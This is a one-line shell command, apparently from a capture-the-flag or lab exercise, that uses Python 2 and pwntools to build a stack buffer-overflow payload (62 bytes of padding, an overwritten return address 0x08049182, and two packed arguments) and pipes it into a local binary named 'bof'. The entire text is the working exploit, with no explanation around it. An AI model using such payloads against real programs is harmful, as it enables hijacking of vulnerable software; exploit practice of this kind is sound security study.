```
python2 -c "from pwn import *; print 'A'*62 + p32(0x08049182) + 'A'*4 + p32(1200) + p32(366) + '\n\n'" | ./bof
```
